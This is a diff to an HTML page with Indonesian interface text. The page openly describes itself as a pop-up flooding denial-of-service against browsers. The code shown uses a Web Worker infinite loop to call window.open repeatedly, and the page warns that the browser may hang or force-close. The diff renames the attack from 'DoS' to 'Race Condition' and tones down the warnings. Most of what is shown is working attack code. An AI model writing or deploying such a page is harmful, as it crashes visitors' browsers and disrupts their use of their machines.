@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Pop-up Blocker Flooding (DoS)</title>
+<title>Pop-up Blocker Race Condition Flood</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -21,11 +21,11 @@ button:disabled { background: #555; }
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Klik tombol ini akan membanjiri browser dengan Pop-up. Browser Anda (terutama Edge) akan hang/force close!</div>
-    <h1>Pop-up Flooding DoS</h1>
-    <p>Menembakkan window.open() tanpa henti via Web Worker.</p>
+    <div class="warning">⚠️ PERINGATAN: Klik tombol ini akan memicu Pop-up Flooding. Browser Anda mungkin akan hang!</div>
+    <h1>Pop-up Race Condition</h1>
+    <p>Menembakkan window.open() tanpa henti via Web Worker & Microtask.</p>
     
-    <button id="start-btn" type="button">Mulai Pop-up Flooding</button>
+    <button id="start-btn" type="button">Mulai Race Condition</button>
     <div id="status" role="status">Sistem siap.</div>
 </div>
 
@@ -40,7 +40,7 @@ button:disabled { background: #555; }
         isRunning = true;
         
         startBtn.disabled = true;
-        statusDiv.textContent = "MEMULAI FLOODING! BROWSER AKAN HANG...";
+        statusDiv.textContent = "MEMULAI RACE CONDITION...";
         statusDiv.style.color = "#ff4444";
 
         // Kode Worker: Infinite Loop untuk mengirim sinyal 'OPEN'
@@ -67,8 +67,8 @@ button:disabled { background: #555; }
                             window.open('https://google.com', '_blank');
                             tabCount++;
                             
-                            // Update status setiap 10 tab
-                            if (tabCount % 10 === 0) {
+                            // Update status setiap 50 tab
+                            if (tabCount % 50 === 0) {
                                 statusDiv.textContent = `Mencoba membuka ${tabCount} tab...`;
                             }
                         } catch (err) {}
